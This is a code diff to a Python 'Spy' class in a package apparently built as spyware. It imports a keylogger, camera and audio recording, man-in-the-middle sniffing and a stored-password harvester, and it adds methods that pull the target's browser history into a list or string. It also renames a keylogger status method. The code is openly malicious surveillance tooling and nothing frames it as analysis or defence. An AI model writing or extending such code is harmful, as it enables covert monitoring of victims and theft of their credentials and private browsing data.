@@ -1,6 +1,7 @@
 import os
 import threading
-from typing import Optional, Tuple
+from datetime import datetime
+from typing import Optional, Tuple, List
 
 from spying.consts import DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_SCREENSHOT_NAME
 from spying.KeyLogger import KeyLogger
@@ -12,7 +13,7 @@ import geocoder
 from spying.encrypt import Encryptor
 from spying.MITM import netstart, filestart, stop_sniffing, is_MITM_runs
 from spying.pc_passwords import get_secrets
-# from browser_history import get_history, get_bookmarks
+from spying.browser import get_browser_info, list_of_history_to_str
 
 
 class Spy:
@@ -60,7 +61,7 @@ class Spy:
         if self.keyLogger:
             return ", ".join(list(self.keyLogger.keys.queue))
 
-    def is_keyLogGer_runs(self):
+    def is_keyLogger_runs(self):
         return self.keyLogger is not None
 
     def start_video_audio_record(self, camindex=None) -> bool:
@@ -195,8 +196,13 @@ class Spy:
         return True
 
     @staticmethod
-    def get_browser_info() -> Tuple[list, list]:
-        return get_history().histories, get_bookmarks().bookmarks
+    def get_browser_info() -> List[Tuple[datetime, str]]:
+        return get_browser_info()
+
+    @classmethod
+    def get_browser_info_str(cls) -> str:
+        return list_of_history_to_str(cls.get_browser_info())
+
 
     @staticmethod
     def get_location():
@@ -206,5 +212,4 @@ class Spy:
     def enter_to_setup(path):
         # TODO: add this
         pass
-
 
